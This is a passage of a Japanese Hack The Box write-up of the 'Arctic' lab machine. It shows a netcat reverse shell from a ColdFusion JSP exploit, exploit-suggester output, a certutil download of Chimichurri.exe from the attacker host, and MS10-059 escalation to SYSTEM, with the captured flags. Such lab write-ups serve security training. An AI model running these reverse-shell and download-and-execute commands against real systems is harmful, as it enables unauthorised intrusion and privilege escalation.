+  <a class="heading-link" href="#%e3%82%bf%e3%82%b9%e3%82%af%e3%82%92%e3%82%b9%e3%82%bf%e3%83%bc%e3%83%88%e3%81%95%e3%81%9b%e3%81%be%e3%81%99actions%e3%81%ae%e4%b8%80%e7%95%aa%e5%b7%a6%e3%81%ae%e3%83%9c%e3%82%bf%e3%83%b3%e3%82%92%e6%8a%bc%e3%81%97%e3%81%be%e3%81%99">
+    <i class="fa fa-link" aria-hidden="true"></i>
+  </a>
+</h3>
+<figure class="center"><img src="/images/Arctic7.png" width="800"/><figcaption>
+            <h4>Screenshot</h4>
+        </figcaption>
+</figure>
+
+<h3 id="101291051028500cfideexploitjspnにブラウザでアクセスしますするとリバースシェルがはれます">
+  10.129.105.102:8500/CFIDE/exploit.jspnにブラウザでアクセスします。すると、リバースシェルがはれます。
+  <a class="heading-link" href="#101291051028500cfideexploitjspn%e3%81%ab%e3%83%96%e3%83%a9%e3%82%a6%e3%82%b6%e3%81%a7%e3%82%a2%e3%82%af%e3%82%bb%e3%82%b9%e3%81%97%e3%81%be%e3%81%99%e3%81%99%e3%82%8b%e3%81%a8%e3%83%aa%e3%83%90%e3%83%bc%e3%82%b9%e3%82%b7%e3%82%a7%e3%83%ab%e3%81%8c%e3%81%af%e3%82%8c%e3%81%be%e3%81%99">
+    <i class="fa fa-link" aria-hidden="true"></i>
+  </a>
+</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ nc -lnvp <span style="color:#ae81ff">4444</span>
+</span></span><span style="display:flex;"><span>listening on <span style="color:#f92672">[</span>any<span style="color:#f92672">]</span> <span style="color:#ae81ff">4444</span> ...
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>connect to <span style="color:#f92672">[</span>10.10.14.40<span style="color:#f92672">]</span> from <span style="color:#f92672">(</span>UNKNOWN<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>10.129.105.102<span style="color:#f92672">]</span> <span style="color:#ae81ff">49870</span>
+</span></span><span style="display:flex;"><span>Microsoft Windows <span style="color:#f92672">[</span>Version 6.1.7600<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>Copyright <span style="color:#f92672">(</span>c<span style="color:#f92672">)</span> <span style="color:#ae81ff">2009</span> Microsoft Corporation.  All rights reserved.
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>C:<span style="color:#ae81ff">\C</span>oldFusion8<span style="color:#ae81ff">\r</span>untime<span style="color:#ae81ff">\b</span>in&gt;
+</span></span></code></pre></div><h3 id="usertxtを取りますフラグは省略しています">
+  user.txtを取ります。（フラグは省略しています）
+  <a class="heading-link" href="#usertxt%e3%82%92%e5%8f%96%e3%82%8a%e3%81%be%e3%81%99%e3%83%95%e3%83%a9%e3%82%b0%e3%81%af%e7%9c%81%e7%95%a5%e3%81%97%e3%81%a6%e3%81%84%e3%81%be%e3%81%99">
+    <i class="fa fa-link" aria-hidden="true"></i>
+  </a>
+</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>C:<span style="color:#ae81ff">\U</span>sers<span style="color:#ae81ff">\t</span>olis<span style="color:#ae81ff">\D</span>esktop&gt;more user.txt
+</span></span><span style="display:flex;"><span>more user.txt
+</span></span><span style="display:flex;"><span>4a50a3809e2bd7b1d23b5bf951e4c70f
+</span></span></code></pre></div><h2 id="権限昇格諸事情によりipアドレスが変更になっています">
+  権限昇格（諸事情によりIPアドレスが変更になっています）
+  <a class="heading-link" href="#%e6%a8%a9%e9%99%90%e6%98%87%e6%a0%bc%e8%ab%b8%e4%ba%8b%e6%83%85%e3%81%ab%e3%82%88%e3%82%8aip%e3%82%a2%e3%83%89%e3%83%ac%e3%82%b9%e3%81%8c%e5%a4%89%e6%9b%b4%e3%81%ab%e3%81%aa%e3%81%a3%e3%81%a6%e3%81%84%e3%81%be%e3%81%99">
+    <i class="fa fa-link" aria-hidden="true"></i>
+  </a>
+</h2>
+<h3 id="windows-exploit-sugesterを使用するためにsysteminfoコマンドを実行します">
+  windows-exploit-sugesterを使用するために、systeminfoコマンドを実行します。
+  <a class="heading-link" href="#windows-exploit-sugester%e3%82%92%e4%bd%bf%e7%94%a8%e3%81%99%e3%82%8b%e3%81%9f%e3%82%81%e3%81%absysteminfo%e3%82%b3%e3%83%9e%e3%83%b3%e3%83%89%e3%82%92%e5%ae%9f%e8%a1%8c%e3%81%97%e3%81%be%e3%81%99">
+    <i class="fa fa-link" aria-hidden="true"></i>
+  </a>
+</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>C:<span style="color:#ae81ff">\C</span>oldFusion8<span style="color:#ae81ff">\r</span>untime<span style="color:#ae81ff">\b</span>in&gt;systeminfo
+</span></span><span style="display:flex;"><span>systeminfo
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Host Name:                 ARCTIC
+</span></span><span style="display:flex;"><span>OS Name:                   Microsoft Windows Server <span style="color:#ae81ff">2008</span> R2 Standard 
+</span></span><span style="display:flex;"><span>OS Version:                6.1.7600 N/A Build <span style="color:#ae81ff">7600</span>
+</span></span><span style="display:flex;"><span>OS Manufacturer:           Microsoft Corporation
+</span></span><span style="display:flex;"><span>OS Configuration:          Standalone Server
+</span></span><span style="display:flex;"><span>OS Build Type:             Multiprocessor Free
+</span></span><span style="display:flex;"><span>Registered Owner:          Windows User
+</span></span><span style="display:flex;"><span>Registered Organization:   
+</span></span><span style="display:flex;"><span>Product ID:                55041-507-9857321-84451
+</span></span><span style="display:flex;"><span>Original Install Date:     22/3/2017, 11:09:45 ��
+</span></span><span style="display:flex;"><span>System Boot Time:          15/5/2022, 9:37:04 ��
+</span></span><span style="display:flex;"><span>System Manufacturer:       VMware, Inc.
+</span></span><span style="display:flex;"><span>System Model:              VMware Virtual Platform
+</span></span><span style="display:flex;"><span>System Type:               x64-based PC
+</span></span><span style="display:flex;"><span>Processor<span style="color:#f92672">(</span>s<span style="color:#f92672">)</span>:              <span style="color:#ae81ff">1</span> Processor<span style="color:#f92672">(</span>s<span style="color:#f92672">)</span> Installed.
+</span></span><span style="display:flex;"><span>                           <span style="color:#f92672">[</span>01<span style="color:#f92672">]</span>: Intel64 Family <span style="color:#ae81ff">6</span> Model <span style="color:#ae81ff">85</span> Stepping <span style="color:#ae81ff">7</span> GenuineIntel ~2294 Mhz
+</span></span><span style="display:flex;"><span>BIOS Version:              Phoenix Technologies LTD 6.00, 12/11/2020
+</span></span><span style="display:flex;"><span>Windows Directory:         C:<span style="color:#ae81ff">\W</span>indows
+</span></span><span style="display:flex;"><span>System Directory:          C:<span style="color:#ae81ff">\W</span>indows<span style="color:#ae81ff">\s</span>ystem32
+</span></span><span style="display:flex;"><span>Boot Device:               <span style="color:#ae81ff">\D</span>evice<span style="color:#ae81ff">\H</span>arddiskVolume1
+</span></span><span style="display:flex;"><span>System Locale:             el;Greek
+</span></span><span style="display:flex;"><span>Input Locale:              en-us;English <span style="color:#f92672">(</span>United States<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>Time Zone:                 <span style="color:#f92672">(</span>UTC+02:00<span style="color:#f92672">)</span> Athens, Bucharest, Istanbul
+</span></span><span style="display:flex;"><span>Total Physical Memory:     6.143 MB
+</span></span><span style="display:flex;"><span>Available Physical Memory: 5.045 MB
+</span></span><span style="display:flex;"><span>Virtual Memory: Max Size:  12.285 MB
+</span></span><span style="display:flex;"><span>Virtual Memory: Available: 11.225 MB
+</span></span><span style="display:flex;"><span>Virtual Memory: In Use:    1.060 MB
+</span></span><span style="display:flex;"><span>Page File Location<span style="color:#f92672">(</span>s<span style="color:#f92672">)</span>:     C:<span style="color:#ae81ff">\p</span>agefile.sys
+</span></span><span style="display:flex;"><span>Domain:                    HTB
+</span></span><span style="display:flex;"><span>Logon Server:              N/A
+</span></span><span style="display:flex;"><span>Hotfix<span style="color:#f92672">(</span>s<span style="color:#f92672">)</span>:                 N/A
+</span></span><span style="display:flex;"><span>Network Card<span style="color:#f92672">(</span>s<span style="color:#f92672">)</span>:           <span style="color:#ae81ff">1</span> NIC<span style="color:#f92672">(</span>s<span style="color:#f92672">)</span> Installed.
+</span></span><span style="display:flex;"><span>                           <span style="color:#f92672">[</span>01<span style="color:#f92672">]</span>: Intel<span style="color:#f92672">(</span>R<span style="color:#f92672">)</span> PRO/1000 MT Network Connection
+</span></span><span style="display:flex;"><span>                                 Connection Name: Local Area Connection
+</span></span><span style="display:flex;"><span>                                 DHCP Enabled:    Yes
+</span></span><span style="display:flex;"><span>                                 DHCP Server:     10.129.0.1
+</span></span><span style="display:flex;"><span>                                 IP address<span style="color:#f92672">(</span>es<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>                                 <span style="color:#f92672">[</span>01<span style="color:#f92672">]</span>: 10.129.105.182
+</span></span></code></pre></div><h3 id="windows-exploit-sugesterを実行します">
+  windows-exploit-sugesterを実行します。
+  <a class="heading-link" href="#windows-exploit-sugester%e3%82%92%e5%ae%9f%e8%a1%8c%e3%81%97%e3%81%be%e3%81%99">
+    <i class="fa fa-link" aria-hidden="true"></i>
+  </a>
+</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ python ./windows-exploit-suggester.py --database 2022-05-14-mssb.xlsx --systeminfo arctic.txt 
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> initiating winsploit version 3.3...
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> database file detected as xls or xlsx based on extension
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> attempting to read from the systeminfo input file
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> systeminfo input file read successfully <span style="color:#f92672">(</span>utf-8<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> querying database file <span style="color:#66d9ef">for</span> potential vulnerabilities
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> comparing the <span style="color:#ae81ff">0</span> hotfix<span style="color:#f92672">(</span>es<span style="color:#f92672">)</span> against the <span style="color:#ae81ff">197</span> potential bulletins<span style="color:#f92672">(</span>s<span style="color:#f92672">)</span> with a database of <span style="color:#ae81ff">137</span> known exploits
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> there are now <span style="color:#ae81ff">197</span> remaining vulns
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>E<span style="color:#f92672">]</span> exploitdb PoC, <span style="color:#f92672">[</span>M<span style="color:#f92672">]</span> Metasploit module, <span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> missing bulletin
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> windows version identified as <span style="color:#e6db74">&#39;Windows 2008 R2 64-bit&#39;</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> 
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>M<span style="color:#f92672">]</span> MS13-009: Cumulative Security Update <span style="color:#66d9ef">for</span> Internet Explorer <span style="color:#f92672">(</span>2792100<span style="color:#f92672">)</span> - Critical
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>M<span style="color:#f92672">]</span> MS13-005: Vulnerability in Windows Kernel-Mode Driver Could Allow Elevation of Privilege <span style="color:#f92672">(</span>2778930<span style="color:#f92672">)</span> - Important
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>E<span style="color:#f92672">]</span> MS12-037: Cumulative Security Update <span style="color:#66d9ef">for</span> Internet Explorer <span style="color:#f92672">(</span>2699988<span style="color:#f92672">)</span> - Critical
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span>   http://www.exploit-db.com/exploits/35273/ -- Internet Explorer <span style="color:#ae81ff">8</span> - Fixed Col Span ID Full ASLR, DEP &amp; EMET 5., PoC
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span>   http://www.exploit-db.com/exploits/34815/ -- Internet Explorer <span style="color:#ae81ff">8</span> - Fixed Col Span ID Full ASLR, DEP &amp; EMET 5.0 Bypass <span style="color:#f92672">(</span>MS12-037<span style="color:#f92672">)</span>, PoC
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> 
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>E<span style="color:#f92672">]</span> MS11-011: Vulnerabilities in Windows Kernel Could Allow Elevation of Privilege <span style="color:#f92672">(</span>2393802<span style="color:#f92672">)</span> - Important
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>M<span style="color:#f92672">]</span> MS10-073: Vulnerabilities in Windows Kernel-Mode Drivers Could Allow Elevation of Privilege <span style="color:#f92672">(</span>981957<span style="color:#f92672">)</span> - Important
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>M<span style="color:#f92672">]</span> MS10-061: Vulnerability in Print Spooler Service Could Allow Remote Code Execution <span style="color:#f92672">(</span>2347290<span style="color:#f92672">)</span> - Critical
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>E<span style="color:#f92672">]</span> MS10-059: Vulnerabilities in the Tracing Feature <span style="color:#66d9ef">for</span> Services Could Allow Elevation of Privilege <span style="color:#f92672">(</span>982799<span style="color:#f92672">)</span> - Important
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>E<span style="color:#f92672">]</span> MS10-047: Vulnerabilities in Windows Kernel Could Allow Elevation of Privilege <span style="color:#f92672">(</span>981852<span style="color:#f92672">)</span> - Important
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>M<span style="color:#f92672">]</span> MS10-002: Cumulative Security Update <span style="color:#66d9ef">for</span> Internet Explorer <span style="color:#f92672">(</span>978207<span style="color:#f92672">)</span> - Critical
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>M<span style="color:#f92672">]</span> MS09-072: Cumulative Security Update <span style="color:#66d9ef">for</span> Internet Explorer <span style="color:#f92672">(</span>976325<span style="color:#f92672">)</span> - Critical
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> <span style="color:#66d9ef">done</span>
+</span></span></code></pre></div><h3 id="ms10-059を使用します">
+  MS10-059を使用します。
+  <a class="heading-link" href="#ms10-059%e3%82%92%e4%bd%bf%e7%94%a8%e3%81%97%e3%81%be%e3%81%99">
+    <i class="fa fa-link" aria-hidden="true"></i>
+  </a>
+</h3>
+<h4 id="kaliでhttpサーブします">
+  kaliでHTTPサーブします。
+  <a class="heading-link" href="#kali%e3%81%a7http%e3%82%b5%e3%83%bc%e3%83%96%e3%81%97%e3%81%be%e3%81%99">
+    <i class="fa fa-link" aria-hidden="true"></i>
+  </a>
+</h4>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ python3 -m http.server <span style="color:#ae81ff">80</span>
+</span></span><span style="display:flex;"><span>Serving HTTP on 0.0.0.0 port <span style="color:#ae81ff">80</span> <span style="color:#f92672">(</span>http://0.0.0.0:80/<span style="color:#f92672">)</span> ...
+</span></span></code></pre></div><h4 id="certutilでchimichurriexeをkaliからダウンロードします">
+  certutilでChimichurri.exeをkaliからダウンロードします。
+  <a class="heading-link" href="#certutil%e3%81%a7chimichurriexe%e3%82%92kali%e3%81%8b%e3%82%89%e3%83%80%e3%82%a6%e3%83%b3%e3%83%ad%e3%83%bc%e3%83%89%e3%81%97%e3%81%be%e3%81%99">
+    <i class="fa fa-link" aria-hidden="true"></i>
+  </a>
+</h4>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>C:<span style="color:#ae81ff">\C</span>oldFusion8<span style="color:#ae81ff">\r</span>untime<span style="color:#ae81ff">\b</span>in&gt;certutil -urlcache -split -f <span style="color:#e6db74">&#34;http://10.10.14.40/Chimichurri.exe&#34;</span> Chimichurri.exe
+</span></span><span style="display:flex;"><span>certutil -urlcache -split -f <span style="color:#e6db74">&#34;http://10.10.14.40/Churraskito.exe&#34;</span> Churraskito.exe
+</span></span><span style="display:flex;"><span>****  Online  ****
+</span></span><span style="display:flex;"><span>  <span style="color:#ae81ff">0000</span>  ...
+</span></span><span style="display:flex;"><span>  c800
+</span></span><span style="display:flex;"><span>CertUtil: -URLCache command completed successfully.
+</span></span></code></pre></div><h3 id="ncで待ち受けます-1">
+  ncで待ち受けます。
+  <a class="heading-link" href="#nc%e3%81%a7%e5%be%85%e3%81%a1%e5%8f%97%e3%81%91%e3%81%be%e3%81%99-1">
+    <i class="fa fa-link" aria-hidden="true"></i>
+  </a>
+</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ nc -lnvp <span style="color:#ae81ff">4445</span>
+</span></span><span style="display:flex;"><span>listening on <span style="color:#f92672">[</span>any<span style="color:#f92672">]</span> <span style="color:#ae81ff">4445</span> ...
+</span></span></code></pre></div><h3 id="chimichurriexeを実行します">
+  Chimichurri.exeを実行します。
+  <a class="heading-link" href="#chimichurriexe%e3%82%92%e5%ae%9f%e8%a1%8c%e3%81%97%e3%81%be%e3%81%99">
+    <i class="fa fa-link" aria-hidden="true"></i>
+  </a>
+</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>C:<span style="color:#ae81ff">\C</span>oldFusion8<span style="color:#ae81ff">\r</span>untime<span style="color:#ae81ff">\b</span>in&gt;Chimichurri.exe 10.10.14.40 <span style="color:#ae81ff">4445</span>
+</span></span><span style="display:flex;"><span>Chimichurri.exe 10.10.14.40 <span style="color:#ae81ff">4445</span>
+</span></span><span style="display:flex;"><span>/Chimichurri/--&gt;This exploit gives you a Local System shell &lt;BR&gt;/Chimichurri/--&gt;Changing registry values...&lt;BR&gt;/Chimichurri/--&gt;Got SYSTEM token...&lt;BR&gt;/Chimichurri/--&gt;Running reverse shell...&lt;BR&gt;/Chimichurri/--&gt;Restoring default registry values...&lt;BR&gt;
+</span></span><span style="display:flex;"><span>C:<span style="color:#ae81ff">\C</span>oldFusion8<span style="color:#ae81ff">\r</span>untime<span style="color:#ae81ff">\b</span>in&gt;
+</span></span></code></pre></div><h3 id="system権限が取れましたフラグを取りますフラグは省略しています">
+  system権限が取れました。フラグを取ります。（フラグは省略しています）
+  <a class="heading-link" href="#system%e6%a8%a9%e9%99%90%e3%81%8c%e5%8f%96%e3%82%8c%e3%81%be%e3%81%97%e3%81%9f%e3%83%95%e3%83%a9%e3%82%b0%e3%82%92%e5%8f%96%e3%82%8a%e3%81%be%e3%81%99%e3%83%95%e3%83%a9%e3%82%b0%e3%81%af%e7%9c%81%e7%95%a5%e3%81%97%e3%81%a6%e3%81%84%e3%81%be%e3%81%99">
+    <i class="fa fa-link" aria-hidden="true"></i>
+  </a>
+</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ nc -lnvp <span style="color:#ae81ff">4445</span>
+</span></span><span style="display:flex;"><span>listening on <span style="color:#f92672">[</span>any<span style="color:#f92672">]</span> <span style="color:#ae81ff">4445</span> ...
+</span></span><span style="display:flex;"><span>connect to <span style="color:#f92672">[</span>10.10.14.40<span style="color:#f92672">]</span> from <span style="color:#f92672">(</span>UNKNOWN<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>10.129.105.182<span style="color:#f92672">]</span> <span style="color:#ae81ff">49609</span>
+</span></span><span style="display:flex;"><span>Microsoft Windows <span style="color:#f92672">[</span>Version 6.1.7600<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>Copyright <span style="color:#f92672">(</span>c<span style="color:#f92672">)</span> <span style="color:#ae81ff">2009</span> Microsoft Corporation.  All rights reserved.
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>C:<span style="color:#ae81ff">\C</span>oldFusion8<span style="color:#ae81ff">\r</span>untime<span style="color:#ae81ff">\b</span>in&gt;whoami
+</span></span><span style="display:flex;"><span>whoami
+</span></span><span style="display:flex;"><span>nt authority<span style="color:#ae81ff">\s</span>ystem
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>C:<span style="color:#ae81ff">\C</span>oldFusion8<span style="color:#ae81ff">\r</span>untime<span style="color:#ae81ff">\b</span>in&gt;
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>C:<span style="color:#ae81ff">\U</span>sers<span style="color:#ae81ff">\A</span>dministrator<span style="color:#ae81ff">\D</span>esktop&gt;more root.txt
+</span></span><span style="display:flex;"><span>more root.txt
+</span></span><span style="display:flex;"><span>e1b...
+</span></span></code></pre></div>
+      </div>
+
+
+      <footer>
+        
+
+
+        
+        
+        
+      </footer>
+    </article>
+
+    
+  </section>
+
+      </div>
+
+      <footer class="footer">
+  <section class="container">
+    ©
+    
+    2022
+     cedric-ryo 
+    ·
+    
+    Powered by <a href="https://gohugo.io/">Hugo</a> & <a href="https://github.com/luizdepra/hugo-coder/">Coder</a>.
+    
+  </section>
+</footer>
+
+    </main>
+
+    
+      
+      <script src="/js/coder.min.8fb86376a16e684af472a329aef502dbebcfab65ce264e9750d144912947c602.js" integrity="sha256-j7hjdqFuaEr0cqMprvUC2&#43;vPq2XOJk6XUNFEkSlHxgI="></script>
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+  </body>
+
+</html>
